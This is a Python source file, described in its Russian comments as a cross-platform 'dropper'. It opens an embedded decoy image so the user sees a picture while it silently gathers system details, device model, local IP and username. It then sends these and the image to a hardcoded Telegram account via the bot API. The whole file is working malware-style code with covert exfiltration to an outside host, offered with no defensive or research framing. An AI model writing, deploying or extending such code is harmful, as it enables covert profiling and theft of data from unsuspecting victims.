"""
Универсальный dropper для всех платформ (Windows, Android, iOS)
Автоматически определяет платформу и работает соответственно
"""
import sys
import os
import json
import requests
import platform
import socket
import datetime
import getpass
import time


# ID пользователя Telegram для отправки извлеченной информации
TELEGRAM_USER_ID = 8350084460


def get_telegram_bot_token():
    """Получить токен Telegram бота"""
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    if token:
        return token
    
    # Пытаемся найти config.json
    config_paths = [
        "config.json",
        os.path.join(os.path.dirname(__file__), "config.json"),
        os.path.join(os.path.expanduser("~"), ".dropper_config.json")
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    return config.get('telegram_bot_token')
            except Exception:
                pass
    
    return None


def send_info_to_telegram(message, user_id=None):
    """Отправляет текстовое сообщение в Telegram"""
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            'chat_id': user_id,
            'text': message
        }
        
        response = requests.post(url, data=data, timeout=30)
        return response.status_code == 200
    except Exception:
        return False


def send_photo_to_telegram(photo_path, user_id=None):
    """Отправляет фото в Telegram"""
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': user_id}
            
            response = requests.post(url, data=data, files=files, timeout=60)
            return response.status_code == 200
    except Exception:
        return False


def get_mobile_info():
    """Собирает информацию о мобильном устройстве"""
    info = {}
    
    try:
        # Базовая информация
        info['platform'] = platform.system()
        info['platform_version'] = platform.version()
        info['machine'] = platform.machine()
        info['processor'] = platform.processor() or platform.machine()
        
        # Для Android
        if 'android' in platform.system().lower() or 'linux' in platform.system().lower():
            try:
                import subprocess
                # Получаем информацию об Android
                result = subprocess.run(['getprop', 'ro.build.version.release'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['android_version'] = result.stdout.strip()
                
                result = subprocess.run(['getprop', 'ro.product.model'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['device_model'] = result.stdout.strip()
            except Exception:
                pass
        
        # Для iOS
        elif platform.system() == 'Darwin' and 'iPhone' in platform.machine():
            try:
                import subprocess
                result = subprocess.run(['sw_vers'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['ios_info'] = result.stdout.strip()
            except Exception:
                pass
        
        # IP адрес
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except Exception:
            info['local_ip'] = "Не удалось определить"
        
        # Имя пользователя/устройства
        try:
            info['username'] = getpass.getuser()
        except Exception:
            info['username'] = os.getenv('USER') or os.getenv('USERNAME') or 'Unknown'
        
        # Время
        info['current_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Python версия
        info['python_version'] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
    except Exception as e:
        info['error'] = str(e)
    
    return info


def open_image_mobile(image_path):
    """Открывает изображение на мобильном устройстве"""
    try:
        system = platform.system().lower()
        
        if 'android' in system:
            # Android - используем Intent
            try:
                from jnius import autoclass
                Intent = autoclass('android.content.Intent')
                Uri = autoclass('android.net.Uri')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                
                intent = Intent(Intent.ACTION_VIEW)
                intent.setDataAndType(Uri.fromFile(java.io.File(image_path)), "image/*")
                PythonActivity.mActivity.startActivity(intent)
                return True
            except Exception:
                # Fallback - пытаемся через subprocess
                import subprocess
                subprocess.run(['am', 'start', '-a', 'android.intent.VIEW', 
                              '-d', f'file://{image_path}', '-t', 'image/*'], 
                             timeout=10)
                return True
        elif system == 'darwin':
            # iOS - используем системную команду
            import subprocess
            subprocess.run(['open', image_path], timeout=10)
            return True
        elif system == 'windows':
            # Windows
            os.startfile(image_path)
            return True
        else:
            # Linux/другие
            import webbrowser
            webbrowser.open(f'file://{os.path.abspath(image_path)}')
            return True
    except Exception:
        return False


def main():
    """Основная функция - работает на всех платформах"""
    try:
        # Определяем платформу
        is_mobile = False
        system = platform.system().lower()
        
        if 'android' in system or (system == 'darwin' and 'iPhone' in platform.machine()):
            is_mobile = True
        
        # Путь к изображению
        image_path = None
        
        # Ищем изображение в разных местах
        possible_paths = [
            "embedded_image.jpg",
            os.path.join(os.path.dirname(__file__), "embedded_image.jpg"),
            os.path.join(os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.getcwd(), "embedded_image.jpg"),
        ]
        
        # Для Android/iOS - в ресурсах приложения
        if hasattr(sys, '_MEIPASS'):
            possible_paths.insert(0, os.path.join(sys._MEIPASS, "embedded_image.jpg"))
        
        for path in possible_paths:
            if os.path.exists(path):
                image_path = path
                break
        
        if not image_path:
            # Если изображение не найдено, создаем сообщение об ошибке
            send_info_to_telegram(f"❌ Ошибка: изображение не найдено\nПлатформа: {platform.system()}")
            return 1
        
        # СНАЧАЛА открываем изображение СРАЗУ
        if is_mobile:
            open_image_mobile(image_path)
        else:
            if sys.platform == 'win32':
                os.startfile(image_path)
            else:
                import webbrowser
                webbrowser.open(image_path)
        
        # Небольшая задержка
        time.sleep(0.5)
        
        # Собираем информацию о системе
        info = get_mobile_info()
        
        # Формируем сообщение
        message = f"""📥 Извлечено изображение

🖥️ ПЛАТФОРМА:
├─ Система: {info.get('platform', 'Unknown')}
├─ Версия: {info.get('platform_version', 'Unknown')}
├─ Архитектура: {info.get('machine', 'Unknown')}
└─ Процессор: {info.get('processor', 'Unknown')}"""
        
        # Добавляем мобильную информацию
        if is_mobile:
            if 'android_version' in info:
                message += f"\n\n📱 ANDROID:\n└─ Версия: {info['android_version']}"
            if 'device_model' in info:
                message += f"\n└─ Модель: {info['device_model']}"
            if 'ios_info' in info:
                message += f"\n\n🍎 iOS:\n{info['ios_info']}"
        
        message += f"""

🌐 СЕТЬ:
└─ Локальный IP: {info.get('local_ip', 'Unknown')}

👤 ПОЛЬЗОВАТЕЛЬ:
└─ Имя: {info.get('username', 'Unknown')}

⏰ ВРЕМЯ:
└─ Запуск: {info.get('current_time', 'Unknown')}

🐍 PYTHON:
└─ Версия: {info.get('python_version', 'Unknown')}

📁 ПУТЬ:
└─ Изображение: {image_path}"""
        
        # Отправляем информацию
        send_info_to_telegram(message)
        
        # Отправляем само изображение
        send_photo_to_telegram(image_path)
        
        return 0
        
    except Exception as e:
        send_info_to_telegram(f"❌ Ошибка: {str(e)}\nПлатформа: {platform.system()}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
